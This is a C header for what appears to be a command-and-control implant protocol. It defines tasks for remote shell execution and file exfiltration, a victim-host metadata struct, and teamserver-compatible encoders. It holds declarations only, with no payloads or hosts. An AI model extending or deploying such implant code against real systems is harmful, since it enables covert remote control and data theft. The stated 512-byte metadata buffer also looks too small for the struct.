#pragma once
#include <stdint.h>

/* Task types */
#define TASK_NOP    0
#define TASK_EXIT   1
#define TASK_SET    2
#define TASK_RUN    12
#define TASK_FILE_STAGE  3
#define TASK_FILE_EXFIL  4

/* Task codes */
#define CODE_EXIT_NORMAL  0
#define CODE_SET_SLEEP    0
#define CODE_RUN_SHELL    0

/* Task flags */
#define FLAG_NONE         ((uint16_t)0)
#define FLAG_ERROR        ((uint16_t)1)
#define FLAG_RUNNING      ((uint16_t)2)
#define FLAG_FRAGMENTED   ((uint16_t)4)
#define FLAG_LAST_FRAG    ((uint16_t)8)

typedef struct {
    uint8_t  type;
    uint8_t  code;
    uint16_t flags;
    uint32_t label;
    uint32_t identifier;
    uint32_t length;
} task_header_t;

typedef struct {
    uint32_t id;
    uint8_t  session_key[32];
    uint32_t sleep;      /* seconds */
    uint32_t jitter;     /* percent */
    char     username[256];
    char     hostname[256];
    char     process_name[256];
    uint32_t process_id;
    uint8_t  arch;       /* 0=x86, 1=x64 */
    uint8_t  platform;   /* 2=Windows */
    uint8_t  integrity;  /* 2=medium, 3=high, 4=system */
} implant_metadata_t;

/* encode_header: serializes h into out[16] (little-endian). */
void encode_header(const task_header_t *h, uint8_t *out);

/* decode_header: deserializes buf[16] (little-endian) into *out. */
void decode_header(const uint8_t *buf, task_header_t *out);

/* encode_run_req: uint32-LE length-prefix + cmd bytes → out; sets *out_len.
   out must be at least strlen(cmd) + 4 bytes. Caller is responsible for
   ensuring the buffer is large enough before calling. */
void encode_run_req(const char *cmd, uint8_t *out, int *out_len);

/* decode_run_req: reads length-prefix, copies string to out_cmd (NUL-terminated).
   Truncates safely if output would exceed max_len. */
void decode_run_req(const uint8_t *buf, int buf_len, char *out_cmd, int max_len);

/* encode_run_rep: same wire format as encode_run_req.
   out must be at least strlen(output) + 4 bytes. */
void encode_run_rep(const char *output, uint8_t *out, int *out_len);

/* encode_metadata: serializes meta → out using teamserver-compatible format.
   Sets *out_len. out must be at least 512 bytes. */
void encode_metadata(const implant_metadata_t *meta, uint8_t *out, int *out_len);
